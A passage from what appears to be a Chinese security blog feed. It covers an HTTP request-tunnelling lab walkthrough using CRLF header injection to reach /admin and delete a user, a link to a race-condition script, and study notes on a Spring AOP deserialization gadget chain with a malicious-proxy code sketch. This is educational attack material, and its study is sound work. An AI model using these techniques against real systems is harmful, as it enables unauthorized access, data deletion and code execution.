攻击步骤中的隧道体现</strong></h3><h4 id="阶段1：CRLF注入（确认漏洞）"><a href="#阶段1：CRLF注入（确认漏洞）" class="headerlink" title="阶段1：CRLF注入（确认漏洞）"></a><strong>阶段1：CRLF注入（确认漏洞）</strong></h4><ul><li><p><strong>操作</strong>：在Header名中插入<code>\r\n</code>，覆盖<code>Host</code>头。</p></li><li><p>隧道体现</p><p>：</p><ul><li><strong>前端视角</strong>：只看到一个Header（<code>foo: bar\r\nHost: abc</code>）。</li><li><strong>后端视角</strong>：解析为两个Header（<code>foo: bar</code>和<code>Host: abc</code>），说明<strong>通过一个请求传递了篡改后的请求信息</strong>。</li><li><strong>本质</strong>：在单个请求中“夹带”额外指令，验证了隧道可行性。</li></ul></li></ul><hr><h4 id="阶段2：构造POST请求走私认证头"><a href="#阶段2：构造POST请求走私认证头" class="headerlink" title="阶段2：构造POST请求走私认证头"></a><strong>阶段2：构造POST请求走私认证头</strong></h4><ul><li><p><strong>操作</strong>：注入<code>Content-Length:500</code>头，填充超长请求体。</p></li><li><p>隧道体现</p><p>：</p><ol><li><p><strong>前端视角</strong>：认为这是一个完整的POST请求（长度500字节）。</p></li><li><p>后端视角</p><p>：</p><ul><li>解析到<code>Content-Length:500</code>后，期望接收500字节的请求体。</li><li>实际请求体长度不足500字节，后端会<strong>等待后续数据</strong>，导致后续请求被拼接。</li></ul></li><li><p>结果</p><p>：</p><ul><li>后端将下一个请求（如用户的其他请求）拼接到当前请求体中。</li><li>攻击者通过观察响应，发现前端添加的认证头（如<code>X-FRONTEND-KEY</code>），证明<strong>后端处理了多个请求</strong>。</li></ul></li></ol><ul><li><strong>隧道作用</strong>：通过单次请求污染后端请求队列，窃取敏感信息。</li></ul></li></ul><hr><h4 id="阶段3：构造HEAD请求隧道访问-admin"><a href="#阶段3：构造HEAD请求隧道访问-admin" class="headerlink" title="阶段3：构造HEAD请求隧道访问&#x2F;admin"></a><strong>阶段3：构造HEAD请求隧道访问&#x2F;admin</strong></h4><ul><li><p><strong>操作</strong>：在Header名中注入完整的<code>GET /admin</code>请求。</p></li><li><p>隧道体现</p><p>：</p><ol><li><p>前端视角</p><p>：</p><ul><li>认为这是一个合法的HEAD请求（无请求体）。</li><li>头部包含<code>foo: bar\r\n...GET /admin...</code>，但前端不解析Header名中的换行符。</li></ul></li><li><p>后端视角</p><p>：</p><ul><li><p>解析Header名时发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>，将其视为</p><p>两个独立请求</p><p>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http复制HEAD / HTTP/1.1          # 主请求 </span><br><span class="line">GET /admin HTTP/1.1       # 隐藏请求（隧道）</span><br></pre></td></tr></table></figure></li></ul></li><li><p>结果</p><p>：</p><ul><li>后端处理<code>GET /admin</code>请求，返回管理页面内容。</li><li>前端只读取HEAD请求的响应（固定长度），但攻击者从响应截断处获取部分敏感数据。</li></ul></li></ol><ul><li><strong>隧道作用</strong>：通过一个请求触发后端执行隐藏的高权限操作。</li></ul></li></ul><hr><h4 id="阶段4：删除用户（最终攻击）"><a href="#阶段4：删除用户（最终攻击）" class="headerlink" title="阶段4：删除用户（最终攻击）"></a><strong>阶段4：删除用户（最终攻击）</strong></h4><ul><li><p><strong>操作</strong>：隧道请求路径改为<code>/admin/delete?username=carlos</code>。</p></li><li><p>隧道体现</p><p>：</p><ul><li><p><strong>前端视角</strong>：仍认为是一个HEAD请求，无副作用。</p></li><li><p>后端视角</p><p>：处理了两个请求：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http复制HEAD /login HTTP/1.1          # 主请求（伪装）</span><br><span class="line">GET /admin/delete?... HTTP/1.1 # 隐藏请求（实际攻击）</span><br></pre></td></tr></table></figure></li><li><p><strong>结果</strong>：用户<code>carlos</code>被删除，实验完成。</p></li><li><p><strong>隧道作用</strong>：完全隐藏攻击行为，前端无法感知。</p></li></ul></li></ul><hr><h3 id="🌰-生活化类比"><a href="#🌰-生活化类比" class="headerlink" title="🌰 生活化类比"></a><strong>🌰 生活化类比</strong></h3><ol><li><strong>快递员（前端）检查包裹</strong>：只检查快递单（请求头），不拆开包裹（请求体）。</li><li><strong>攻击者（你）</strong>：在快递单上写“内附贺卡”，实际在包裹里藏了“销毁货物指令”（隐藏请求）。</li><li><strong>仓库（后端）</strong>：拆开包裹后，执行“销毁指令”，但快递员只看到“贺卡已送达”。</li><li><strong>结果</strong>：货物被销毁，但快递系统（前端）无记录。</li></ol><hr><h3 id="🔍-总结：隧道的关键特征"><a href="#🔍-总结：隧道的关键特征" class="headerlink" title="🔍 总结：隧道的关键特征"></a><strong>🔍 总结：隧道的关键特征</strong></h3><ol><li><strong>请求嵌套</strong>：一个外层请求包裹内层恶意请求。</li><li><strong>解析差异</strong>：前端和后端对请求边界的理解不同。</li><li><strong>隐蔽执行</strong>：恶意请求的响应被前端忽略或部分截断，但攻击效果生效。</li></ol><hr><h3 id="⚡-快速自查：哪里用到了隧道？"><a href="#⚡-快速自查：哪里用到了隧道？" class="headerlink" title="⚡ 快速自查：哪里用到了隧道？"></a><strong>⚡ 快速自查：哪里用到了隧道？</strong></h3><ul><li><strong>注入额外请求头</strong>（如<code>GET /admin</code>） → 隧道传递恶意指令。</li><li><strong>修改协议或方法</strong>（如HEAD改为POST） → 掩盖隧道请求。</li><li><strong>利用响应截断</strong> → 隐藏隧道请求的完整响应。</li></ul><p><strong>只有同时满足以上三点，才是完整的隧道攻击！</strong></p>]]></content>
      
      
      <categories>
          
          <category> 请求走私 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 请求走私 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>适用场景比较广泛的条件竞争脚本</title>
      <link href="/2025/05/10/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/"/>
      <url>/2025/05/10/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>之前拉了一坨脚本.大佬们轻点喷. 写了个自定义程度高且操作方法不算太麻烦的条件竞争脚本( 因为我发现很多师傅的条件竞争脚本都是现场搓的.或者拿模板改了又改的.就写了个不用二次搓的适用场景比较多的脚本<a href="https://github.com/cxkhanhan/Custom-Race-Condition">https://github.com/cxkhanhan/Custom-Race-Condition</a></p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/ee4b9d6e-0204-4a37-90b6-1126e1871175.png" alt="ee4b9d6e-0204-4a37-90b6-1126e1871175"></p>]]></content>
      
      
      <categories>
          
          <category> race </category>
          
      </categories>
      
      
        <tags>
            
            <tag> race </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>spring aop漏洞学习笔记(污染链分析&amp;项目源码分析)</title>
      <link href="/2025/03/09/spring%20aop%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E6%B1%A1%E6%9F%93%E8%BF%9E%E5%88%86%E6%9E%90&amp;%E9%A1%B9%E7%9B%AE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90)/"/>
      <url>/2025/03/09/spring%20aop%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E6%B1%A1%E6%9F%93%E8%BF%9E%E5%88%86%E6%9E%90&amp;%E9%A1%B9%E7%9B%AE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90)/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>笔者:han</p><p>qq:1512624649</p><p>博客:<a href="http://hanblog.top(有的时候会挂掉懒得重新起)/">http://hanblog.top(有的时候会挂掉懒得重新起)</a></p><p>请开代理访问。图床在github。不然加载不出来(</p><p>本笔记项目地址：<a href="https://github.com/Ape1ron/SpringAopInDeserializationDemo1">https://github.com/Ape1ron/SpringAopInDeserializationDemo1</a></p><p>此笔记在原作者文章的分析基础上加上一些笔记和理解。以及对项目源代码的一次详细分析(笔者没写的地方做补充)更好看懂。</p><p>若有错误欢迎大佬指出</p><h2 id="前置知识需要-动态代理-代理-拦截器-切面-单例对象-通知等等（按自己需要决定是否跳过）"><a href="#前置知识需要-动态代理-代理-拦截器-切面-单例对象-通知等等（按自己需要决定是否跳过）" class="headerlink" title="前置知识需要:动态代理 代理 拦截器 切面 单例对象 通知等等（按自己需要决定是否跳过）"></a>前置知识需要:动态代理 代理 拦截器 切面 单例对象 通知等等（按自己需要决定是否跳过）</h2><p>以下是这些概念和组件的详细解析及其关系图：</p><h3 id="核心概念与关系总览"><a href="#核心概念与关系总览" class="headerlink" title="核心概念与关系总览"></a><strong>核心概念与关系总览</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">    A[动态代理] --&gt; B[JDK动态代理]</span><br><span class="line">    A --&gt; C[CGLIB动态代理]</span><br><span class="line">    B --&gt; D[InvocationHandler]</span><br><span class="line">    C --&gt; E[MethodInterceptor]</span><br><span class="line">    D --&gt; F[拦截器逻辑]</span><br><span class="line">    E --&gt; F[拦截器逻辑]</span><br><span class="line">    F --&gt; G[Advice]</span><br><span class="line">    G --&gt; H[通知类型]</span><br><span class="line">    H --&gt; H1[@Before]</span><br><span class="line">    H --&gt; H2[@After]</span><br><span class="line">    H --&gt; H3[@Around]</span><br><span class="line">    G --&gt; I[Advisor]</span><br><span class="line">    I --&gt; J[Pointcut]</span><br><span class="line">    I --&gt; K[Advice]</span><br><span class="line">    J --&gt; L[AspectJExpressionPointcut]</span><br><span class="line">    K --&gt; M[AspectJAroundAdvice]</span><br><span class="line">    I --&gt; N[DefaultIntroductionAdvisor]</span><br><span class="line">    O[AdvisedSupport] --&gt; P[配置中心]</span><br><span class="line">    P --&gt; Q[目标对象]</span><br><span class="line">    P --&gt; R[拦截器链]</span><br><span class="line">    P --&gt; S[代理接口]</span><br><span class="line">    R --&gt; T[DefaultAdvisorChainFactory]</span><br><span class="line">    U[SingletonAspectInstanceFactory] --&gt; V[切面单例管理]</span><br></pre></td></tr></table></figure><h3 id="1-基础概念层"><a href="#1-基础概念层" class="headerlink" title="1. 基础概念层"></a><strong>1. 基础概念层</strong></h3><h4 id="1-代理-Proxy"><a href="#1-代理-Proxy" class="headerlink" title="(1) 代理 (Proxy)"></a><strong>(1) 代理 (Proxy)</strong></h4><ul><li><strong>定义</strong>：一种设计模式，通过中间对象控制对原始对象的访问。</li><li><strong>作用</strong>：实现权限控制、延迟加载、日志记录等<strong>横切关注点</strong>。</li><li><strong>类型</strong>：<ul><li><strong>静态代理</strong>：手动编写代理类（编译时确定）</li><li><strong>动态代理</strong>：运行时动态生成代理类</li></ul></li></ul><h4 id="2-动态代理-Dynamic-Proxy"><a href="#2-动态代理-Dynamic-Proxy" class="headerlink" title="(2) 动态代理 (Dynamic Proxy)"></a><strong>(2) 动态代理 (Dynamic Proxy)</strong></h4><ul><li><strong>实现方式</strong>：<ul><li><strong>JDK动态代理</strong>：基于接口（要求目标对象实现接口）</li><li><strong>CGLIB****动态代理</strong>：基于继承（可代理无接口的类）</li></ul></li><li><strong>核心接口</strong>：<ul><li><code>InvocationHandler</code>（JDK代理）</li><li><code>MethodInterceptor</code>（CGLIB代理）</li></ul></li></ul><h4 id="3-拦截器-Interceptor"><a href="#3-拦截器-Interceptor" class="headerlink" title="(3) 拦截器 (Interceptor)"></a><strong>(3) 拦截器 (Interceptor)</strong></h4><ul><li><strong>本质</strong>：实现方法调用拦截的组件</li><li><strong>典型实现</strong>：<ul><li><code>MethodInterceptor</code>（Spring AOP）</li><li><code>HandlerInterceptor</code>（Spring MVC）</li></ul></li></ul><h4 id="4-单例对象-Singleton"><a href="#4-单例对象-Singleton" class="headerlink" title="(4) 单例对象 (Singleton)"></a><strong>(4) 单例对象 (Singleton)</strong></h4><ul><li><strong>定义</strong>：在整个应用中只有一个实例的对象</li><li><strong>Spring默认作用域</strong>：Bean默认单例</li><li><strong>与代理的关系</strong>：代理对象本身通常是单例的</li></ul><h3 id="2-AOP核心层"><a href="#2-AOP核心层" class="headerlink" title="2. AOP核心层"></a><strong>2. AOP核心层</strong></h3><h4 id="1-切面-Aspect"><a href="#1-切面-Aspect" class="headerlink" title="(1) 切面 (Aspect)"></a><strong>(1) 切面 (Aspect)</strong></h4><ul><li><strong>定义</strong>：模块化的横切关注点（如日志、事务）</li><li><strong>组成</strong> &#x3D; <strong>通知 (Advice)</strong> + <strong>切点 (Pointcut)</strong></li></ul><h4 id="2-通知-Advice"><a href="#2-通知-Advice" class="headerlink" title="(2) 通知 (Advice)"></a><strong>(2) 通知 (Advice)</strong></h4><ul><li><strong>类型</strong>：<ul><li><code>@Before</code>：方法执行前</li><li><code>@AfterReturning</code>：方法正常返回后</li><li><code>@AfterThrowing</code>：方法抛出异常后</li><li><code>@After</code>：方法最终执行（类似finally）</li><li><code>@Around</code>：完全控制方法执行（最强大）</li></ul></li></ul><p>通知里还有自定义逻辑这段代码就是切面要执行的代码，它决定了当目标方法被拦截时，实际要做什么。</p><h4 id="3-切点-Pointcut"><a href="#3-切点-Pointcut" class="headerlink" title="(3) 切点 (Pointcut)"></a><strong>(3) 切点 (Pointcut)</strong></h4><ul><li><strong>定义</strong>：通过表达式定义需要拦截的方法</li><li><strong>实现类</strong>：<ul><li><code>AspectJExpressionPointcut</code>（基于AspectJ语法）</li></ul></li></ul><h3 id="3-Spring-AOP实现层"><a href="#3-Spring-AOP实现层" class="headerlink" title="3. Spring AOP实现层"></a><strong>3. Spring AOP实现层</strong></h3><h4 id="1-AdvisedSupport"><a href="#1-AdvisedSupport" class="headerlink" title="(1) AdvisedSupport"></a><strong>(1) AdvisedSupport</strong></h4><ul><li><strong>角色</strong>：AOP配置中心</li><li><strong>存储内容</strong>：<ul><li>目标对象（Target）</li><li>拦截器链（Advisors）</li><li>代理接口（Interfaces）</li><li>配置标志（如exposeProxy）</li></ul></li></ul><h4 id="2-Advisor"><a href="#2-Advisor" class="headerlink" title="(2) Advisor"></a><strong>(2) Advisor</strong></h4><ul><li><strong>定义</strong>：Advice的包装器，关联Advice和Pointcut</li><li><strong>类型</strong>：<ul><li><code>PointcutAdvisor</code>：通用类型</li><li><code>IntroductionAdvisor</code>：用于动态添加接口</li><li><code>DefaultIntroductionAdvisor</code>：实现类</li></ul></li></ul><h4 id="3-DefaultAdvisorChainFactory"><a href="#3-DefaultAdvisorChainFactory" class="headerlink" title="(3) DefaultAdvisorChainFactory"></a><strong>(3) DefaultAdvisorChainFactory</strong></h4><ul><li><p><strong>作用</strong>：根据AdvisedSupport生成拦截器调用链</p></li><li><p><strong>核心方法</strong>：</p><ul><li><pre><code class="language-Java">List&lt;MethodInterceptor&gt; getInterceptors(Advised config, Method method, Class&lt;?&gt; targetClass)<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### **(4) SingletonAspectInstanceFactory**</span><br><span class="line"></span><br><span class="line">- **作用**：确保切面实例是单例的</span><br><span class="line">- **使用场景**：管理`@Aspect`注解的类实例</span><br><span class="line"></span><br><span class="line">### **4. 关键类详解**</span><br><span class="line"></span><br><span class="line">#### **(1) MethodInterceptor**</span><br><span class="line"></span><br><span class="line">```Java</span><br><span class="line">public interface MethodInterceptor extends Interceptor &#123;</span><br><span class="line">    Object invoke(MethodInvocation invocation) throws Throwable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></code></pre></li></ul></li><li><p><strong>使用场景</strong>：CGLIB代理的拦截逻辑实现</p></li><li><p><strong>与InvocationHandler的区别</strong>：</p><ul><li><code>InvocationHandler</code>：JDK代理专用</li><li><code>MethodInterceptor</code>：更灵活，支持嵌套调用</li></ul></li></ul><h4 id="2-AspectJAroundAdvice"><a href="#2-AspectJAroundAdvice" class="headerlink" title="(2) AspectJAroundAdvice"></a><strong>(2) AspectJAroundAdvice</strong></h4><ul><li><strong>作用</strong>：实现<code>@Around</code>通知的底层类</li><li><strong>协作组件</strong>：<ul><li><code>MethodInvocationProceedingJoinPoint</code>：封装目标方法调用</li><li><code>AspectJExpressionPointcut</code>：定义拦截范围</li></ul></li></ul><h4 id="3-DefaultIntroductionAdvisor"><a href="#3-DefaultIntroductionAdvisor" class="headerlink" title="(3) DefaultIntroductionAdvisor"></a><strong>(3) DefaultIntroductionAdvisor</strong></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DefaultIntroductionAdvisor</span> <span class="keyword">implements</span> <span class="title class_">IntroductionAdvisor</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Advice advice;</span><br><span class="line">    <span class="keyword">private</span> Class&lt;?&gt; interfaceType;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>特殊用途</strong>：动态为对象添加新接口</li><li><strong>漏洞利用场景</strong>：让字符串对象伪装成<code>Map</code>接口实现</li></ul><h3 id="5-完整协作流程"><a href="#5-完整协作流程" class="headerlink" title="5. 完整协作流程"></a><strong>5. 完整协作流程</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">sequenceDiagram</span><br><span class="line">    participant Client</span><br><span class="line">    participant Proxy</span><br><span class="line">    participant AdvisedSupport</span><br><span class="line">    participant AdvisorChainFactory</span><br><span class="line">    participant MethodInterceptor</span><br><span class="line"></span><br><span class="line">    Client-&gt;&gt;Proxy: 调用方法()</span><br><span class="line">    Proxy-&gt;&gt;AdvisedSupport: 获取配置</span><br><span class="line">    AdvisedSupport-&gt;&gt;AdvisorChainFactory: 生成拦截器链</span><br><span class="line">    AdvisorChainFactory-&gt;&gt;AdvisedSupport: 返回MethodInterceptor列表</span><br><span class="line">    loop 拦截器链执行</span><br><span class="line">        Proxy-&gt;&gt;MethodInterceptor: invoke()</span><br><span class="line">        MethodInterceptor-&gt;&gt;目标方法: 执行前后逻辑</span><br><span class="line">    end</span><br><span class="line">    Proxy--&gt;&gt;Client: 返回结果</span><br></pre></td></tr></table></figure><h3 id="6-漏洞利用中的典型组合"><a href="#6-漏洞利用中的典型组合" class="headerlink" title="6. 漏洞利用中的典型组合"></a><strong>6. 漏洞利用中的典型组合</strong></h3><h4 id="1-构造恶意代理链"><a href="#1-构造恶意代理链" class="headerlink" title="(1) 构造恶意代理链"></a><strong>(1) 构造恶意代理链</strong></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建AdvisedSupport并注入恶意配置</span></span><br><span class="line"><span class="type">AdvisedSupport</span> <span class="variable">advisedSupport</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">advisedSupport.setTarget(<span class="string">&quot;任意对象&quot;</span>);</span><br><span class="line"><span class="comment">// 通过反射绕过安全检查</span></span><br><span class="line">Reflections.setFieldValue(advisedSupport, <span class="string">&quot;advisors&quot;</span>, maliciousAdvisors);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成代理对象</span></span><br><span class="line"><span class="type">AopProxy</span> <span class="variable">proxy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdkDynamicAopProxy</span>(advisedSupport);</span><br><span class="line"><span class="type">Map</span> <span class="variable">evilMap</span> <span class="operator">=</span> (Map) proxy.getProxy();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 触发攻击（如反序列化时调用toString）</span></span><br><span class="line">evilMap.toString(); <span class="comment">// 执行恶意代码</span></span><br></pre></td></tr></table></figure><h4 id="2-关键组件的作用"><a href="#2-关键组件的作用" class="headerlink" title="(2) 关键组件的作用"></a><strong>(2) 关键组件的作用</strong></h4><table><thead><tr><th>组件</th><th>攻击中的作用</th></tr></thead><tbody><tr><td><code>DefaultIntroductionAdvisor</code></td><td>让代理对象实现危险接口（如<code>Map</code>）</td></tr><tr><td><code>AspectJAroundAdvice</code></td><td>嵌入恶意代码（如命令执行）</td></tr><tr><td><code>AdvisedSupport</code></td><td>集中管理攻击配置</td></tr><tr><td><code>MethodInterceptor</code></td><td>实际执行攻击逻辑的拦截器</td></tr></tbody></table><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><ul><li><strong>动态代理</strong>是实现AOP的底层技术</li><li><strong>AdvisedSupport</strong>是Spring AOP的配置枢纽</li><li><strong>Advisor</strong>将拦截逻辑（Advice）与触发条件（Pointcut）绑定</li><li><strong>MethodInterceptor</strong>和<strong>InvocationHandler</strong>是不同代理实现的拦截核心</li><li>理解这些组件的关系是分析Spring漏洞（如内存马注入）的关键基础</li></ul><h2 id="污染链顺序分析："><a href="#污染链顺序分析：" class="headerlink" title="污染链顺序分析："></a>污染链顺序分析：</h2><h3 id="寻找污染点："><a href="#寻找污染点：" class="headerlink" title="寻找污染点："></a>寻找污染点：</h3><p>污染点的作用：通过反射调用函数。</p><p>后续再通过寻找各种利用链触发污染点。然后用反射调用其他方法</p><p>org.springframework.aop.aspectj.AbstractAspectJAdvice</p><p>在这个类下invokeAdviceMethodWithGivenArgs存在反射调用</p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/asynccode" alt="img"></p><p>又从readobject这个类里发现这个aspectjadvicemethod字段会被重新赋值</p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/image-20250309181018520.png" alt="image-20250309181018520"></p><p>aspectjadvicemethod这是一个属性。这个属性指向的是这个拦截器会调用的函数</p><p>再来简单了解一下invoke。invoke的常见写法是这样的method.invoke(object,args)</p><p>method是需要操作的类的方法。通过反射获取。</p><p>object是这个类的实例对象。</p><p>args是这个方法的传递参数。</p><p>由此我们可以发现method和args都是可控的。一个通过readobject一个是invokeAdviceMethodWithGivenArgs(args)传递的。</p><p>object是一个对象。这个对象需要有getAspectInstance()这个函数。并且他需要序列化和反序列化。所以由此可以知道他需要实现一个aspectInstanceFactory和Serializable接口的对象</p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/asynccode" alt="img"></p><p>我们发现这里有九个继承这个接口的类。找一下发现</p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/asynccode" alt="img"></p><p>这个类SingletonAspectInstanceFactory是符合要求的。所以只需要传入一个这个的对象就可以实现反射调用</p><h3 id="寻找利用链"><a href="#寻找利用链" class="headerlink" title="寻找利用链"></a>寻找利用链</h3><p>需要注意的是<code>invokeAdviceMethodWithGivenArgs</code> 是 Spring AOP 内部调用的</p><p>所以在项目的完整poc里是找不到<code>invokeAdviceMethodWithGivenArgs</code> 这个的。我们需要通过一系列利用链去触发这里</p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/asynccode" alt="img"></p><p>这里又两个相似的invokeAdviceMethod。追下面还是上面都一样的。这里就用下面的</p><p>我们可以发现追溯一下</p><p>利用链这里也就变成了</p><p>AspectAroundAdvice#invoke-&gt;invokeAdviceMethod-&gt;invokeAdviceMethodWithGivenArgs</p><p>在项目里的poc也是通过AspectAroundAdvice去触发的</p><p>再往上追溯</p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/asynccode" alt="img"></p><p>有四个可以运用了这里的invoke</p><p>这三个分别的作用如下</p><p>ReflectiveMethodInvocation 是 <strong>Spring</strong> <strong>AOP</strong> <strong>的核心类</strong>，用于 *<em>管理并执行</em><em><strong>拦截器</strong></em>*链（**<strong>Interceptor</strong> <strong>Chain）</strong>。</p><p><strong>当代理对象的方法被调用时，Spring</strong> <strong>AOP</strong> <strong>通过这个类依次执行**<strong>拦截器</strong></strong>，最终调用目标方法。**</p><p>DebugInterceptor<strong>是一个**<strong>拦截器</strong></strong>（<strong><strong>Interceptor</strong></strong>），用于** <strong>AOP</strong> <strong>调试</strong>。<strong>它会拦截方法调用，并在方法执行前后打印日志信息</strong>，帮助开发者分析 AOP 执行过程。</p><p><strong><code>ExposeBeanNameAdvisors</code></strong> <strong>主要用于 Spring</strong> <strong>AOP</strong> <strong>代理，让代理对象能够知道自己的 Bean 名称。</strong></p><p><strong>在<strong><strong>拦截器</strong></strong>链中获取当前 Bean 的名称。</strong></p><p><strong>支持</strong> <strong><code>@ExposeProxy</code></strong> <strong>功能，使方法调用时可以获取代理对象本身。</strong></p><p>三个到底通过谁触发呢</p><p>我们先看DebugInterceptor</p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/asynccode" alt="img"></p><p>这里是no usages没有使用的。无法通过别的东西触发。而且自身也没有Serializable去支持这个类序列化。所以不符合要求。</p><p>这里需要再次明确一下我们的要求。通过一个有继承Serializable这个接口的类去调用。所以上面这个不符合条件</p><p>再看这个ExposeBeanNameIntroduction</p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/asynccode" alt="img"></p><p>有一个usage</p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/asynccode" alt="img"></p><p>但是在往上追就会发现又是no usages。并且这个类也是没有Serializable的</p><p>所以最后看看ReflectiveMethodInvocation他也不是继承Serializable接口的</p><p>但我们发现这个有多处的usages。并且这里的JdkDynamicAopProxy是存在Serializable接口的</p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/asynccode" alt="img"></p><p>我们发现当我们通过JdkDynamicAopProxy创建的代理对象的时候。如果这个时候还有一个拦截器链。那么就会先执行拦截器链再执行目标对象的函数。而在这个时候就会触发ReflectiveMethodInvocation的代码。如下</p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/asynccode" alt="img"></p><p>最后通过BadAttributeValueExpException去触发这个代理对象。这个触发会在下面的项目源代码分析里提及。这里不重复叙述了</p><p>明确完了整条利用链了。我们看一下完整利用链的图然后分析参数</p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/asynccode" alt="img"></p><h3 id="分析参数"><a href="#分析参数" class="headerlink" title="分析参数"></a>分析参数</h3><p>我们再分析一下这里所需的参数</p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/asynccode" alt="img"></p><p>这里的参数分析直接用项目作者的话(偷个懒。感觉自己讲和他讲的其实差不多。作者的可能更好)</p><p>第一个点是<code>interceptorOrInterceptionAdvice</code>的获取，是从<code>interceptorsAndDynamicMethodMatchers</code>中拿到的，该属性本身定义就是一个List，可以序列化，而索引currentInterceptorIndex本身也只是int类型。因此可以认为<code>interceptorOrInterceptionAdvice</code>是可控的。</p><p>第二个点是<code>interceptorOrInterceptionAdvice</code>的类型，按照笔者上面的调用链，这个对象的类型是<code>org.springframework.aop.aspectj.AspectJAroundAdvice</code>（<code>AbstractAspectJAdvice</code>的子类），那么<code>proceed</code>代码是走下面的分支，省去了一部分麻烦：）</p><p>最后就差JdkDynamicAopProxy这个类里的参数分析了。开始吧：</p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/asynccode" alt="img"></p><p>我们需要满足if条件才能触发ReflectiveMethodInvocation</p><p>所以需要看这个函数了getInterceptorsAndDynamicInterceptionAdvice</p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/asynccode" alt="img"></p><p>这里的cached有两种赋值方式：</p><ol><li>从缓存的methodCache中获取</li><li>通过getInterceptorsAndDynamicInterceptionAdvice方法</li></ol><p>methodCache属性，本身加了<code>transient</code>修饰符导致这个字段不能被序列化。我们是无法通过反序列化控制的，并且在<code>readObject</code>方法中是直接新建的赋值的，判断这条路是不可行的。</p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/asynccode" alt="img"></p><p>所以分析getInterceptorsAndDynamicInterceptionAdvice这个函数</p><p><img 